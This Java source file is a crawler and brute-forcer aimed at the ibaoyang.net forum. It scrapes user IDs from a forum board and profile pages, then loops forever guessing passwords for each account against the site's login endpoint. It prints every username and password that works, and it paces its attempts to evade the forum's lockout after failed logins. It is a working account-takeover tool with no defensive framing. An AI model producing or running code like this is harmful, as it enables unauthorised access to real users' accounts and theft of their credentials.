package net.pickapack.notice.helper.crawler;

import net.pickapack.dateTime.DateHelper;
import net.pickapack.action.Function1;
import net.pickapack.action.Predicate;
import net.pickapack.cracker.CrackResult;
import net.pickapack.cracker.PasswordCracker;
import net.pickapack.spider.noJs.crawler.NoJSCrawler;
import net.pickapack.spider.noJs.spider.HttpMethod;
import net.pickapack.spider.noJs.spider.NoJSSpider;
import net.pickapack.spider.noJs.spider.Page;
import org.apache.commons.lang.time.StopWatch;
import org.apache.http.message.BasicNameValuePair;
import org.w3c.dom.Node;

import javax.xml.transform.TransformerException;
import javax.xml.xpath.XPathExpressionException;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.*;

public class iBaoyangForumNoJSCrawler extends NoJSCrawler {
    private List<String> userIds;

    public iBaoyangForumNoJSCrawler() {
        this(null, -1);
    }

    public iBaoyangForumNoJSCrawler(String proxyHost, int proxyPort) {
        super(NoJSSpider.FIREFOX_3_6, 60000, proxyHost, proxyPort);
        this.userIds = new ArrayList<String>();
    }

    @SuppressWarnings("unchecked")
    @Override
    protected void onPageVisited(Page page, Map<String, Object> context) {
        System.out.printf("[%s] Visiting page: %s\n", DateHelper.toString(new Date()), page.getUrl());

        String url = page.getUrl().toString();

        if (url.startsWith("http://www.ibaoyang.net/forum.php?mod=forumdisplay&fid=")) {
            this.visitLinks(page, "//tbody[starts-with(@id,'normalthread_')]//td[@class='by']//cite//a[starts-with(@href,'home.php?mod=space&uid=')]", null, new Function1<Node, String>() {
                @Override
                public String apply(Node param) {
                    return "http://www.ibaoyang.net/" + param.getAttributes().getNamedItem("href").getNodeValue();
                }
            });
            this.visitLinks(page, "//a[@class='nxt'][1]", null, new Function1<Node, String>() {
                @Override
                public String apply(Node param) {
                    return "http://www.ibaoyang.net/" + param.getAttributes().getNamedItem("href").getNodeValue();
                }
            });
        } else if (url.startsWith("http://www.ibaoyang.net/home.php?mod=space&uid=")) {
            Node nodeUserId = page.getFirstByXPath("//div[@id='wp']//div[@id='uhd']//div[@class='h cl']//h2[@class='mt']//text()");
            String userId = nodeUserId.getNodeValue();
            System.out.println("userId: " + userId);
            this.userIds.add(userId);
        }
    }

    public void grabUserIds(String url) {
        try {
            this.visit(new URL(url));
        } catch (MalformedURLException e) {
            throw new RuntimeException(e);
        }
    }

    public boolean login(String url, String userId, String password) {
        try {
            System.out.printf("[%s] Logging in as: %s\n", DateHelper.toString(new Date()), userId);

            ArrayList<org.apache.http.NameValuePair> requestParameters = new ArrayList<org.apache.http.NameValuePair>();

            requestParameters.add(new BasicNameValuePair("fastloginfield", "username"));
            requestParameters.add(new BasicNameValuePair("username", userId));
            requestParameters.add(new BasicNameValuePair("password", password));
            requestParameters.add(new BasicNameValuePair("quickforward", "yes"));
            requestParameters.add(new BasicNameValuePair("handlekey", "ls"));

            String response = this.getPage(new URL(url), HttpMethod.POST, requestParameters, null, null).getText();

            System.out.println("response: " + response);

            return !response.contains("密码错误") && !response.contains("登录失败");
        } catch (IOException e) {
            recordException(e);
            return false;
        } catch (XPathExpressionException e) {
            throw new RuntimeException(e);
        } catch (TransformerException e) {
            throw new RuntimeException(e);
        }
    }

    public List<String> getUserIds() {
        return userIds;
    }

    public static void main(String[] args) throws FileNotFoundException, InterruptedException {
        iBaoyangForumNoJSCrawler crawlerGrabUserIds = new iBaoyangForumNoJSCrawler();
        crawlerGrabUserIds.grabUserIds("http://www.ibaoyang.net/forum.php?mod=forumdisplay&fid=43");

        Map<String, CrackResult> crackedUsers = new HashMap<String, CrackResult>();
        for (final String userId : crawlerGrabUserIds.getUserIds()) {
            crackedUsers.put(userId, new CrackResult(false, "", 0));
        }
        crawlerGrabUserIds.close();

        for (; ; ) {
            StopWatch stopWatch = new StopWatch();
            stopWatch.start();

            for (final String userId : crackedUsers.keySet()) {
                CrackResult crackResultFound = crackedUsers.get(userId);

                if (!crackResultFound.isCracked()) {
                    System.out.printf("[# Cracked users: %d] cracking user id: %s%n", crackedUsers.size(), userId);

                    CrackResult crackResult = PasswordCracker.crack(new Predicate<String>() {
                        @Override
                        public boolean apply(String guessedPassword) {
                            iBaoyangForumNoJSCrawler crawlerLogin = new iBaoyangForumNoJSCrawler();

                            System.out.printf("[%s] Logging %s with password: %s\n", DateHelper.toString(new Date()), userId, guessedPassword);
                            return crawlerLogin.login("http://www.ibaoyang.net/member.php?mod=logging&action=login&loginsubmit=yes&infloat=yes&lssubmit=yes&inajax=1", userId, guessedPassword);
                        }
                    }, 5, crackedUsers.get(userId).getEndIndex());

                    if (crackResult != null) {
                        crackedUsers.put(userId, crackResult);
                    }
                }
            }

            System.out.printf("# Cracked users: %d%n", crackedUsers.size());
            for (String userId : crackedUsers.keySet()) {
                CrackResult crackResult = crackedUsers.get(userId);

                if (crackResult.isCracked()) {
                    System.out.println("userId: " + userId + ", password: " + crackResult);
                }
            }

            stopWatch.stop();

            long timeToSleep = 15 * 60 * 1000 - stopWatch.getTime();
            System.out.printf("Sleeping for %d milliseconds. due to incorrect login restriction%n", timeToSleep);
            Thread.sleep(timeToSleep);
        }
    }
}
